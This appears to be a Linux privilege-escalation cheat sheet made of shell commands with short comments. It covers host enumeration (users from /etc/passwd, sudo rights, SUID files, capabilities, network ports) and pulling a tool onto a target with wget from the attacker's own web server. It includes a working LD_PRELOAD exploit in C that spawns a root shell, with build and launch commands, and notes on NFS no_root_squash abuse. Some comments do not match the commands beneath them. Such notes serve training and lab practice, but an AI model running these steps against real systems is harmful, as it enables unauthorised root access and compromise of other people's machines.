#Hostname
hostname

#Kernel
uname -a
uname -r

#proc filesystem
/proc/version

#Systems 
/etc/issue

#Processes
ps -A
#Tree
ps axjf
#All users, launched, not attached to terminal
ps aux

#Environmental variables
env

#list all commands your user can run using sudo
sudo -l

#Listing
ls -la

#User overview
id

#List all users
cat /etc/passwd | cut -d ":" -f 1
cat /etc/passwd | grep home

#Network information
ifconfig
#Route information
ip route

#All network connections and ports
netstat -a
#List all protocols
netstat -at
#Ports in listening mode
netstat -l
#Network usage statistics by protocol
netstat -l
#Connections with the service name and PID information
netstat -tp
#List listening ports
netstat -l
#Interface statistics
netstat -i
#All, do not resolve names, display timers
netstat -ano

#Find directory under /
find / -type d -name config
#Find files with the 777 permissions
find / -type d -name config
#Find executable files
find / -perm a=x
#Find all files for user “frank” under “/home”
find /home -user frank
#Find files that were modified in the last 10 days
find / -mtime 10
#Find files that were accessed in the last 10 day
find / -atime 10
#Find files changed within the last hour (60 minutes)
find / -cmin -60
#Find files accesed within the last hour (60 minutes)
find / -amin -60
#Find files over 50MB
find / -size +50M
#Find world-writeable folders
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null
# Find files with the SUID bit
find / -perm -u=s -type f 2>/dev/null


#File transfer
#Local machine
python -m http.server 8000
#Target machine
wget http://<your-local-ip>:8000/<filename>

#Sudo
#List sudo priviliges
sudo -l
#List of sudo escalations https://gtfobins.github.io
#LD_PRELOAD environment option escalations

#Escalation C code
##include <stdio.h>
##include <sys/types.h>
##include <stdlib.h>

#void _init() {
#unsetenv("LD_PRELOAD");
#setgid(0);
#setuid(0);
#system("/bin/bash");
#}

#gcc -fPIC -shared -o shell.so shell.c -nostartfiles
#sudo LD_PRELOAD=/home/user/ldpreload/shell.so find

#List SUID and SGID files
find / -type f -perm -04000 -ls 2>/dev/null

#List capabilities
getcap -r / 2>/dev/nul

#Cron jobs
vi /etc/crontab

#Writable folders
find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

#NFS lisitng, search for no_root_squash
cat /etc/exports
#enumerate mountable shares
showmount -e 
#mount 
mount -o rw target:/folder folder
#chmod +s